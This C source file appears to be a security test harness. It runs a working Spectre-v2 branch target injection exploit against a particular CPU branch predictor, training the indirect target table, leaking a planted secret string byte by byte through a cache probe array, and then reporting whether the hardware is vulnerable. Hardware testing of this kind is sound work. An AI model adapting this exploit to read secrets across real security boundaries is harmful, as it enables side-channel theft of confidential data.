/**
 * spectre-v2: Branch Target Injection via the Indirect Target Table, multi-byte.
 *
 * Cross-site injection using the verified ITT geometry: 32 direct-mapped
 * entries, idx = pc[5:1]^ghr[4:0], tag = pc[13:5]^ghr[13:5]
 * (rapt_bpu.sv:330-332).  PC bits >= 14 are in neither, so two JALRs exactly
 * 32 KiB apart are exact aliases.  The attacker site trains the shared ITT
 * entry to a gadget; the victim site (architectural target benign) then
 * transiently redirects to it.  Redirect needs a BTB INDR tag match
 * (rapt_bpu.sv:690-691), so the victim site is executed first to populate it.
 *
 * Multi-byte: the gadget leaks secret_str[leak_index]; leak_index walks the
 * secret string and each byte is recovered from the probe argmax (canonical
 * readMemoryByte accumulation).
 *
 * Transient isolation: the probe array is evicted BEFORE training (a chase
 * between train and trigger perturbs GHR and kills the GHR-sensitive ITT
 * redirect).  The null arm trains to gadget_null, so a secret-index hit in the
 * attack arm but not the null arm is attributable to the gadget_secret path.
 * A history preamble runs before both sites so ghr[13:0] matches at train/query.
 */
#include "bench.h"

#ifndef SECURITY_ATTACK_ROUNDS
#define SECURITY_ATTACK_ROUNDS 60
#endif
#ifndef SECURITY_SECRET_LEN
#define SECURITY_SECRET_LEN 8
#endif
#define TRAIN_ROUNDS 30

static uint8_t probe_array[SC_PROBE_ENTRIES * SC_PROBE_STRIDE]
    __attribute__((aligned(SC_PAGE_BYTES)));

static const char secret_str[] = "The Magic Words are Squeamish Ossifrage.";
static volatile uint32_t leak_index;

__attribute__((noinline))
static void gadget_secret(void) {
  volatile uint8_t tmp =
      probe_array[(uintptr_t)(uint8_t)secret_str[leak_index] * SC_PROBE_STRIDE];
  (void)tmp;
}

__attribute__((noinline))
static void gadget_null(void) {
  volatile uint8_t tmp = probe_array[0];
  (void)tmp;
}

__attribute__((noinline))
static void benign(void) {
  asm volatile("nop");
}

static void *tgt_attack;
static void *tgt_victim;

/* One injection round.  Eviction runs BEFORE training: the ITT injection is
 * GHR-sensitive and a capacity chase between train and trigger perturbs the
 * history enough to kill the redirect.  The null arm (gadget_null) controls
 * specificity, so the secret-index signal is attributable to the gadget path. */
static void inject_round(sc_alias_t *al, const sc_geom_t *g) {
  sc_evict_capacity(g);
  volatile uint8_t sink = (uint8_t)secret_str[leak_index];
  (void)sink;
  sc_fence();
  sc_hist_prime();
  al->b(&tgt_victim);
  for (int t = 0; t < TRAIN_ROUNDS; t++) {
    sc_hist_prime();
    al->a(&tgt_attack);
  }
  sc_hist_prime();
  al->b(&tgt_victim);
  sc_fence();
}

static int read_byte(int idx, sc_alias_t *al, const sc_geom_t *g,
                     uint32_t tries, uint32_t *score) {
  leak_index = (uint32_t)idx;
  tgt_attack = (void *)gadget_secret;
  tgt_victim = (void *)benign;
  sc_score_t atk;
  sc_score_reset(&atk);
  for (uint32_t t = 0; t < tries; t++) {
    inject_round(al, g);
    sc_probe_array(probe_array, g, &atk, 0x2222 + t);
    atk.rounds++;
  }
  int best = sc_argmax(&atk);
  *score = atk.hits[best];
  return best;
}

int main(void) {
  if (sc_time_selfcheck("spectre-v2") != 0)
    return 1;
  sc_geom_t g;
  sc_calibrate(&g);
  if (sc_evict_selftest(&g) != 0) {
    printf("SCRESULT spectre-v2 ERROR reason=evict\n");
    return 1;
  }

  sc_alias_t al;
  if (sc_alias_make(&al, SC_DELTA_ITT, sc_itt_stub, sc_itt_stub_len()) != 0) {
    printf("SCRESULT spectre-v2 SKIP reason=no-alias-arena\n");
    printf("[spectre-v2] SKIP: cannot build a 32 KiB alias pair here\n");
    return 0;
  }

  for (int i = 0; i < SC_PROBE_ENTRIES; i++)
    probe_array[(uintptr_t)i * SC_PROBE_STRIDE] = 0;
  sc_fence();
  uint32_t R = SECURITY_ATTACK_ROUNDS;

  /* Positive control: architectural gadget call must register. */
  leak_index = 0;
  int expect = (uint8_t)secret_str[0];
  sc_score_t pos;
  sc_score_reset(&pos);
  for (uint32_t r = 0; r < R; r++) {
    sc_evict_capacity(&g);
    sc_fence();
    gadget_secret();
    sc_fence();
    sc_probe_array(probe_array, &g, &pos, 0xb0b + r);
    pos.rounds++;
  }
  int pos_ok = pos.hits[expect] >= R / 2;

  /* Multi-byte leak: walk the secret string. */
  uint8_t recovered[SECURITY_SECRET_LEN];
  uint32_t scores[SECURITY_SECRET_LEN];
  int matched = 0;
  printf("[spectre-v2] leaking %d bytes via ITT injection (delta=0x%x):\n",
         SECURITY_SECRET_LEN, (unsigned)SC_DELTA_ITT);
  for (int i = 0; i < SECURITY_SECRET_LEN; i++) {
    int got = read_byte(i, &al, &g, R * 5, &scores[i]);
    recovered[i] = (uint8_t)got;
    int ok = (got == (uint8_t)secret_str[i]);
    matched += ok;
    printf("  [%2d] want=0x%02x '%c' got=0x%02x '%c' score=%u/%u %s\n",
           i, (uint8_t)secret_str[i],
           (secret_str[i] > 31 && secret_str[i] < 127) ? secret_str[i] : '?',
           got, (got > 31 && got < 127) ? got : '?',
           (unsigned)scores[i], (unsigned)(R * 5), ok ? "OK" : "miss");
  }

  /* Rigorous single-byte verdict with a null arm (gadget_null) at byte 0. */
  leak_index = 0;
  sc_score_t atk, nul;
  sc_score_reset(&atk);
  sc_score_reset(&nul);
  for (uint32_t r = 0; r < R * 5; r++) {
    tgt_attack = (void *)gadget_secret;
    tgt_victim = (void *)benign;
    inject_round(&al, &g);
    sc_probe_array(probe_array, &g, &atk, 0x2222 + r);
    atk.rounds++;
    tgt_attack = (void *)gadget_null;
    inject_round(&al, &g);
    sc_probe_array(probe_array, &g, &nul, 0x3333 + r);
    nul.rounds++;
  }
  sc_decision_t d = sc_decide(&atk, &nul, expect, pos_ok);
  sc_result("spectre-v2", &d, pos_ok, expect, R * 5, &g);

  int multibit_ok = pos_ok && matched >= (SECURITY_SECRET_LEN + 1) / 2;
  printf("SCRESULT spectre-v2-multibit %s pos=%d leaked=%d/%d rounds=%u\n",
         multibit_ok ? "VULNERABLE" : "NOT_VULNERABLE", pos_ok, matched,
         SECURITY_SECRET_LEN, (unsigned)R);
  printf("[spectre-v2] recovered %d/%d bytes: ", matched, SECURITY_SECRET_LEN);
  for (int i = 0; i < SECURITY_SECRET_LEN; i++)
    putchar((recovered[i] > 31 && recovered[i] < 127) ? recovered[i] : '?');
  putchar('\n');
  if (d.verdict == SC_VULNERABLE || multibit_ok)
    printf("[spectre-v2] VULNERABLE: multi-byte ITT cross-site injection leak\n");
  else if (!pos_ok)
    printf("[spectre-v2] INCONCLUSIVE: positive control failed\n");
  else
    printf("[spectre-v2] NOT VULNERABLE or insufficient signal\n");
  sc_alias_free(&al);
  return 0;
}